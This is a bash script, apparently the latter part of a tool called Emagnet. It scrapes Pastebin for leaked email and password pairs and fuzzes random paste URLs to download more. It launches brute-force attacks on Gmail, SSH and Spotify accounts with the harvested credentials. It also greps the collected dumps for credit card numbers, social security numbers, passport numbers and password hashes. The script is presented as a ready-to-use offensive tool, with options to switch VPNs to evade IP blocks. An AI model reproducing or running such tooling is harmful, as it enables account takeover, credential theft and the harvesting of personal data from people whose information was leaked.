p=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S'|sed 's/|/:/g'|awk '{print $1}'|cut -d: -f1|uniq|grep -v '"'\|','\|'<'|tr ' ' '\n')
pl=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|grep '\S' |sed 's/|/:/g'|tr ' ' '\n')
pt=$(grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP|awk '{print $1}'|cut -d: -f2,3|uniq|grep -v ''\|'/'\|'"'\|','\|'<'\|'>'\|'\/'\|'\\'|grep -v /|wc -l)

((10#0$it > 00));((10#0$pt > 00))

if [[ $pt -gt "00" ]] && [[ $it -gt "00" ]]; then
    echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: \e[1;31m$(whoami)\e[0m - Found \e[1;32m$pt\e[0m password from: $EMAGNETPW/${i##*/}" | xargs >> $EMAGNETLOGS/emagnet.log
    grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b\\:.*$" $EMAGNETTEMP|awk '{print $1}' |cut -d: -f2,3 |uniq | grep -v '/' | grep -v '"' | grep -v ','|grep -v '<' | grep -v '>' >> $EMAGNETLOGS/passwords-from-pastebin.txt 
    grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP| cut -d: -f2 |uniq >> $EMAGNETLOGS/emails-from-pastebin.txt
    printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n";printf "%19s[\e[1;32m$pt\e[0m] - Passwords Found\n\n";printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"

if [[ $NOTIFY = "true" ]]; then
    notify-send "Emagnet" "\n$tt - Files downloaded\n $pt - Passwords found\n$it - Email addresses found"
fi

cp -rn $p $EMAGNETPW/ &> /dev/null
cp -rn $i $EMAGNETDB/ &> /dev/null
sleep 2

if [[ $GBRUTEFORCE = "true" ]]; then
   printf "%64s \n\n" | tr ' ' '='
   printf "%14s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mO\e[1;33mO\e[1;34mG\e[0;32mL\E[1;31mE\e[0m") ACCOUNTS\e[0m\n\n"
   bruter
   sleep 2

elif [[ $SBRUTEFORCE = "true" ]]; then
   printf "%64s \n\n" | tr ' ' '='
   printf "%14s";printf "BRUTE FORCING -- SSH ACCOUNTS\e[0m\n\n"
   sshbruter
   sleep 2

elif [[ $PBRUTEFORCE = "true" ]]; then
   printf "%64s \n\n" | tr ' ' '='
   printf "%12s";printf "BRUTE FORCING -- SPOTIFY ACCOUNTS\e[0m\n\n"
   spotifybruter
   sleep 2
else
   sleep 0
fi

cp -rn $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
    elif [[ $pt = "00" ]] && [[ $it -gt "00" ]]; then
        echo -e "[$(date +%d/%m/%Y\ -\ %H:%M)]: $(whoami) - Found \e[1;36m$it\e[0m  emails from $EMAGNETDB/${i##*/}"    | xargs >> $EMAGNETLOGS/emagnet.log
        grep -rEiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' $EMAGNETTEMP| cut -d: -f2 |uniq >> $EMAGNETLOGS/emails-from-pastebin.txt
        sleep 2
        cp $i $EMAGNETDB/ &> /dev/null;

if [[ $SBRUTEFORCE = "true" ]]; then
  cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
elif [[ $GBRUTEFORCE = "true" ]]; then
  cp -rn $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
else
  mv $EMAGNETTEMP/* $EMAGNETALL &> /dev/null
fi

printf "%19s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
printf "%19s[\e[1;31m00\e[0m] - Passwords Found\n\n"
printf "%19s[\e[1;32m$it\e[0m] - Email Addresses Found\n\n"

if [[ $NOTIFY = "true" ]]; then
    notify-send "Emagnet" "\n$tt - Files downloaded\n 00 - Passwords found\n$it - Email addresses found"
fi

    sleep 5

else
printf "%17s[\e[1;32m$tt\e[0m] - Files Downloaded\n\n"
printf "%17s[\e[1;31m00\e[0m] - No Passwords Was Found\n\n"
printf "%17s[\e[1;31m00\e[0m] - No Email Address Was Found\n\n"

if [[ $NOTIFY = "true" ]]; then
   notify-send "Emagnet" "\n$tt - Files downloaded\n 00 - Passwords found\n00 - Email addresses found"
fi
   sleep 3.2
fi
   pkill -9 notify-send &> /dev/null
}















dontstopwhenfound() {
$BROWSER -dump $PASTEBIN|grep -q "blocked your IP"
if [[ $? = "0" ]]; then 
   if [[ $VPN = "true" ]]; then 
       banned
    else Iwasbanned
   fi
fi

for (( ; ; )); do 
  clear
  banner
  countdown
  clear
  banner
  analyz
  clear
  banner
  emagnet2
       if [[ $GBRUTEFORCE = "true" ]]; then 
         bruter
         mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
       elif [[ $SBRUTEFORCE = "true" ]]; then 
         sshbruter
         mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
       else 
         mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
       fi
done
}

































fuzzer() {
source /etc/emagnet.conf
clear
banner
    echo -e "                         FUZZER is: \e[1;32mON\e[0m\n"
    printf "%64s \n\n" | tr ' ' '='

YUP="[\e[1;32m>>\e[0m]"
NOPE="[\e[1;31m<<\e[0m]"

    echo -e "[\e[1;33m--\e[0m] - Generating \e[1m$2\e[0m urls."
    echo -e "[\e[1;33m--\e[0m] - -------------------"
      for urls in $(seq 1 $2); do
          fuz=https://pastebin.com/raw/$(tr -dc a-zA-Z0-9 < /dev/urandom | head -c 8)
          fuzname="$(echo $fuz|cut -d/ -f5)"
          echo -e "[\e[1;32m>>\e[0m] - Trying to download: $fuz"
        echo $fuz|xargs -n 1000 -P 1000 -I{} wget -q https://pastebin.com/raw/$fuzname
            if [[ $? -eq "0" ]]; then
                   echo -e $YUP - Downloaded $fuz;
              else
                   echo -e "$NOPE - No luck this time for $fuzname..\n"
              fi
      done
}














check4all() {
     conf
     copyconf
     iconnection
     mustbefilled
     paths
     copyconf
     safety

}



case $1 in
"-a"|"-author"|"--author")
author
;;

"emagnet"|"-e"|"-emagnet"|"--emagnet")
conf
sed -i 's/GBRUTEFORCE=true/GBRUTEFORCE=false/g' $CONF
sed -i 's/SBRUTEFORCE=true/SBRUTEFORCE=false/g' $CONF
sed -i 's/PBRUTEFORCE=true/PBRUTEFORCE=false/g' $CONF
        clear
        banner
        check4all
        PWD="$(pwd)"
   if [[ -d "/usr/bin" ]]; then
      if ! [[ -h "/usr/bin/emagnet" ]] || ! [[ -L "/usr/bin/emagnet" ]] ; then
          cd /usr/bin/
          ln -s $PWD/emagnet emagnet
      fi
   fi

if [[ $GBRUTEFORCE = "false" ]]; then 
dontstopwhenfound
 elif [[ $sBRUTEFORCE = "false" ]]; then 
  dontstopwhenfound
  elif [[ $PBRUTEFORCE = "false" ]]; then 
    dontstopwhenfound
 else 
  mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
fi
;;

"-bruteforce"|"--bruteforce")
conf
check4all
sleep 0.5
if [[ $2 = "gmail" ]]; then
        conf
        sed -i 's/GBRUTEFORCE=false/GBRUTEFORCE=true/g' $CONF
        conf
        if [[ $GBRUTEFORCE = "true" ]]; then
        clear
        banner
        printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        dontstopwhenfound
        bruter
        mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
        fi
elif [[ $2 = "ssh" ]]; then
        conf
        sed -i 's/SBRUTEFORCE=false/SBRUTEFORCE=true/g' $CONF
        conf
        if [[ $SBRUTEFORCE = "true" ]]; then
        clear
        banner
        printf "%20s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        dontstopwhenfound
        sshbruter
        fi
        mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
elif [[ $2 = "spotify" ]]; then
        conf
        sed -i 's/PBRUTEFORCE=false/PBRUTEFORCE=true/g' $CONF
        conf
        if [[ $PBRUTEFORCE = "true" ]]; then
        clear
        banner
        printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
        printf "\n%64s \n\n" | tr ' ' '='
        dontstopwhenfound
        printf "\n%64s \n\n" | tr ' ' '='
        spotifybruter
        fi
        mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
else
       printf "emagnet: unknown error -- you forgot something, eh?\n"
       exit 1
fi
;;

"f"|"-f"|"-fuzzer"|"--fuzzer")
  if [[ -z $2 ]]; then
        clear
        banner
        echo -e "[\e[1;31m<<\e[0m] You must specify how many urls to generate..\n" 
        exit 1
  fi
        fuzzer

;;


"F"|"-find"|"--find")
echo
COLUMNS=1
conf

PS3='
What are you looking for: '
options=(
	"Find HTTP/HTTPs/FTPs/FTP urls"
        "Find Images"
        "Find MD5 Hashes"
	"Find Valid MySQL-Old Hashes"
	"Find Blowfish Hashes"
	"Find VBulletin Hashes"
	"Find PHPBB3-MD5"
	"Find Wordpress-MD5"
	"Find Drupal 7"
	"Find Old Unix-md5"
	"Find MD5-Apr1"
	"Find SHA512cCrypt"
	"Find Floating Point Numbers"
	"Find Visa Credit Cards"
	"Find American Express Credit Cards"
	"Find Diners Club Cards"
	"Find Discover Cards"
	"Find JCB Cards"
	"Find AMEX Cards"
	"Find Social Security Number (SSN) (US)"
	"Find Indiana Driver License Number"
	"Find US Passport Cards"
	"Find US Passport Number"
	"Find US Phone Numbers"
        "Find ISBN Numbers"
	"Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Find HTTP/HTTPs/FTPs/FTP urls")
         for urls in $(grep -rEo "(http|https|ftp/ftps)://[a-zA-Z0-9./?=_-]*" $EMAGNETHOME|cut -d: -f2,3|awk -F, '!seen[$1]++'|sort); do echo URL: $urls; done ;;

        "Find Images")
        find $EMAGNETHOME -type f |xargs -P $THREADS grep -rE -o "(http|https|ftp|ftps)://[a-zA-Z0-9./?=_-]*(\.jpg|png|gif|bmp|tiff|jpeg|jpeg2|pbm)$" $EMAGNETHOME|awk -F, '!seen[$1]++'  ;;

        "Find MD5 Hashes")
         egrep -roE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' $EMAGNETHOME | egrep -ro '[a-fA-F0-9]{32}' $EMAGNETHOME|grep -v "000000000000000000000000" ;;

        "Find valid MySQL-Old hashes")
         grep -re "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" $EMAGNETHOME ;;

        "Find Blowfish Hashes")
        grep -re "$2a\$\08\$(.){75}" $EMAGENT ;;

        "Find VBulletin Hashes")
        egrep -ro "([0-9a-zA-Z]{32}):(S{3,32})" $EMAGNETHOME ;;

        "Find PHPBB3-MD5")
        egrep -ro '$H$S{31}' $EMAGNETHOME ;;

        "Find Wordpress-MD5")
        egrep -ro '$P$S{31}' $EMAGNETHOME ;;

        "Find Drupal 7")
        egrep -ro '$S$S{52}' $EMAGNETHOME ;;

        "Find Old Unix-md5")
         egrep -ro '$1$w{8}S{22}' $EMAGNETHOME ;;

        "Find MD5-Apr1")
        egrep -ro '$apr1$w{8}S{22}' $EMAGNETHOME ;;

        "Find SHA512cCrypt")
        egrep -ro '$6$w{8}S{86}' $EMAGNETHOME ;;

        "Find Floating Point Numbers")
        grep -E -ro "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" $EMAGNETHOME ;;

        "Find Visa Credit Cards")
         grep -riE -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}"$EMAGNETHOME|awk -F, '!seen[$1]++'  ;;

        "Find MasterCard Credit Cards")
         grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" $EMAGNETHOME ;;

        "Find American Express Credit Cards")
         grep -rE -o "\b3[47][0-9]{13}\b" $EMAGENT ;;

        "Find Diners Club Cards")
         grep -rE -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" $EMAGNETHOME ;;

        "Find Discover Cards")
        grep -rE -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" $EMAGNETHOME ;;

        "Find JCB Cards")
        grep -rE -o "\b(?:2131|1800|35d{3})d{11}\b" $EMAGNETHOME ;;

        "Find AMEX Cards")
        grep -rE -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" $EMAGNETHOME ;;

        "Find Social Security Numbers")
        grep -rE -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" $EMAGENT ;;

        "Find Indiana Driver License Number")
        grep -rE -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" $EMAGNETHOME ;;

        "Find US Passport Cards")
        grep -rE -o "C0[0-9]{7}" $EMAGNETHOME ;;

        "Find US Passport Number")
         grep -rE -o "[23][0-9]{8}" $EMAGNETHOME ;;

        "Find US Phone Numbers")
         grep -rPo 'd{3}[s-_]?d{3}[s-_]?d{4}' $EMAGNETHOME ;;

        "Find ISBN Numbers")
         egrep -ra -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" $EMAGNETHOME ;;

        "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done

;;


"help"|"-h"|"-help"|"--help")
        usage
        exit 1 
 ;;

"-i"|"-ip"|"--ip") 
       printf 'IP: %s\n' "$(curl -s https://nr1.nu/i/)"
       exit 
;;

"-k"|"-kill"|"--kill")
ESESSIONS=$(ps aux|grep -i "emagnet"|sed '$d'|awk '{print $2}')
NRESESSIONS=$(ps aux|grep -i "emagnet"|sed '$d'|awk '{print $2}'|wc -l)
NRINSCREEN="$(screen -ls |grep emagnet|awk -F"." '{print $1}'|sed 's/\t//g'|wc -l)"
INSCREEN="$(screen -ls |grep emagnet|awk -F"." '{print $1}'|sed 's/\t//g')"
  
       clear
       banner
 		if [[ $INSCREEN -gt "0" ]]; then
   			for screens in $INSCREEN; do
      			screen -X -S $screens kill
   		   		if [[ $? = "0" ]]; then
 			       		echo -e "[\e[1;31m<<\e[0m] - $NRINSCREEN emagnet screens has been killed\n"
      			fi
   			done
		fi

if [[ $NRESESSIONS -lt "3" ]]; then
     echo -e "[\e[0;33m<<\e[0m] - Duh! \e[4m0\e[0m emagnet sessions is currently running..\n"
else 
     echo -e "[\e[1;31m<<\e[0m] - Killed $(echo $NRESESSIONS-2|bc) emagnet sessions ... (#+_+)"
     kill -SIGKILL $ESESSIONS &> /dev/null
fi 
;;

"-l"|"-license"|"--license") printf "%s\n" "Printing LICENSE - Use 'q' to quit";sleep 2;curl -s https://nr1.nu/licenses/LICENSE.md|less;printf "%s\n" "Thank you.." ;;
"-m"|"-move"|"--move") conf;check4all;moveem                                                             ;;
"-s"|"-spam"|"--spam") conf;check4all;emagnetspammer                                                     ;;
"-d"|"-stats"|"--stats") conf;check4all;stats;exit 1                                                     ;;
"-x"|"-syntax"|"--syntax") conf;check4all;clear;banner;emagnetsyntax                                     ;;
"-q"|"-quiet"|"--quiet") conf;check4all;pid="$(ps aux |grep emagnet)";screen -dmS emagnet "emagnet --emagnet"
                         printf "[\e[1;32m>>\e[0m] - Emagnet has been started in background (pid:$(ps aux|grep "SCREEN -dmS emagnet"|awk '{print $2}'|head -n1))\n" ;;
"version"|"-version"|"--version"|"-V") conf:printf "Emagnet Version: v$VERSION\n" 			 ;;

"-t"|"-time"|"--time")
     conf

if [[ -z $2 ]]; then
     echo "emagnet: internal error -- time require a number to be used"
     exit 1
fi

re='^[0-9]+$'
if ! [[ $2 =~ $re ]] ; then
   echo -e "emagnet: internal error -- that's not a valid number" >&2; exit 1
fi
     sed -i '30d' $CONF
     sed -i "30 i TIME=$2" $CONF
     printf "emagnet: config file has been updated -- refresh time has been set to: $2 seconds\n"
     exit 1
;;

"-n"|"-notify"|"--notify")
     notify-send --help &> /dev/null
     if [[ $? -gt "0" ]]; then
        echo -e "$basename$0: internal error -- notify-send is required for get notifications"
        exit 1
     fi

      if [[ -z $2 ]]; then
       echo -e "$basename$0: internal error -- you must use true or false"
       exit 1
     fi
conf
     if [[ $? -eq "0" ]] && [[ $2 = "true" ]]; then
        sed -i '137d' $CONF
        sed -i "137 i NOTIFY=true" $CONF
        printf "$basename$0: config file has been updated -- notifications has been enable\n"
     fi

     if [[ $? -eq "0" ]] && [[ $2 = "disable" ]]; then
        sed -i '137d' $CONF
        sed -i "137 i NOTIFY=false" $CONF
        printf "$basename$0: config file has been updated -- notifications has beendisable\n"
     fi
;;

 "-v"|"-vpn"|"--vpn")
conf
if [[ $VPNPROVIDER = "$VPNROOT/" ]]; then 
    echo -e "$basename$0: internal error -- you must set a vpn provider before you can enable vpn";exit 1;fi
if [[ -z $2 ]]; then echo -e "emagnet: internal error -- you must include true or false";exit 1;fi
if [[ $2 = "true" ]] || [[ $2 = "on" ]] || [[ $2 = "enable" ]]; then
     sed -i '149d' $CONF;sed -i "149i VPN=true" $CONF;echo -e "emagnet: config file has been updated -- vpn has been enabled";exit 1
elif [[ $2 = "false" ]] || [[ $2 = "off" ]] || [[ $2 = "disable" ]]; then
     sed -i '149d' $CONF;sed -i "149i VPN=false" $CONF;echo -e "emagnet: config file has been updated -- vpn has been disabled";exit 1
else echo -e "emagnet: internal error -- $2 is an unknown option -- valid options is true or false"
     exit 1;fi
;;

"-b"|"-backup"|"--backup")
    clear;banner;conf

if [[ ! -d $EMAGNETBACKUP ]]; then
   mkdir -p $EMAGNETBACKUP
fi

if [[ ! -d "$EMAGNET" ]]; then
    echo "[\e[1;32m<<\e[0m] - Duh! Can't do anything since no emagnet folder exists, aborted.."
exit 1
fi

if [[ -f "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz" ]] && [[ -f "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz" ]] && -f "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz" ]]; then
         echo "You have already created a backup today.."
         read -p "Do you want to overwrite the old backup (yes/no) " overwriteoldbackup
    if [[ $overwriteoldbackup = "yes" ]]; then
if [[ $* = "all" ]]; then
         rm "$EMAGNETBACKUP/emagnet-$(date +%d%m%Y).tar.gz"
         echo -e "Removed old backup.."
         echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ $? -eq "0" ]]; then
             tar -cf - --absolute-names "$EMAGNET"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz"
         else
             tar -cjf "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz" "$EMAGNET"
         fi
elif [[ $* = "incoming" ]]; then
         rm "$EMAGNETBACKUP/emagnet-$(date +%d%m%Y).tar.gz"
         echo -e "Removed old backup.."
         echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ $? -eq "0" ]]; then
            tar -cf - --absolute-names "$EMAGNET/incoming"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz"
         else
            tar -cjf "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz" "$EMAGNET/incoming"
         fi
elif [[ $* = "archive" ]]; then
         echo -e "Removed old backup.."
         echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ $? -eq "0" ]]; then
              tar -cf - --absolute-names "$EMAGNETBACKUP"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz"
         else
              tar -cjf "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz" "$EMAGNETBACKUP"
         fi
else
         printf "emagnet: error -- please specify incoming, archive or all\n\n"
         exit 1
fi
    else
         printf "Aborted..\n"
fi
    exit 1
fi

if [[ $2 = "all" ]]; then
       echo -e "Compressing $EMAGNET, please wait.."
         pigz -h &> /dev/null
         if [[ $? -eq "0" ]]; then
            tar -cf - --absolute-names "$EMAGNET"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz"
         else
            tar -cjf "$EMAGNETBACKUP/emagnet-all-$(date +%d%m%Y).tar.gz" "$EMAGNET"
         fi

elif [[ $2 = "incoming" ]]; then
       echo -e "Compressing $EMAGNET, please wait.."
         if [[ $? -eq "0" ]]; then
            tar -cf - --absolute-names "$EMAGNET/incoming"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz"
         else
            tar -cjf "$EMAGNETBACKUP/emagnet-incoming-$(date +%d%m%Y).tar.gz" "$EMAGNET/incoming"
         fi

elif [[ $2 = "archive" ]]; then
         pigz -h &> /dev/null
         if [[ $? -eq "0" ]]; then
              tar -cf - --absolute-names "$EMAGNETBACKUP"| pigz -0 -p "$THREADS" --fast > "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz"
         else 
              tar -cjf "$EMAGNETBACKUP/emagnet-archive-$(date +%d%m%Y).tar.gz" "$EMAGNETBACKUP"
         fi  

else
         echo -e "emagnet: error -- please specify incoming, archive or all\n"
         exit 1
fi
      printf "\nBackup has successfully been created..\n\n"

;;

"-S"|"-setup"|"--setup")
if [[ $1 = "--setup" ]]; then
 if [[ $? -eq "0" ]]; then
    mustberoot
    clear; banner
    alreadyconfigured
    setupconf
    checkbrowser
    requirements
    wip
    cpusetup
    pathsetup
    timesetup
 else
	printf "emagnet: internal errror -- unknown error\n"
 fi
fi 
;;

	"\?")  usage 											     ;;
   	"*")   clear;banner;printf "emagnet: internal error -- use -help for available commands'\n\n";exit 1 ;;
esac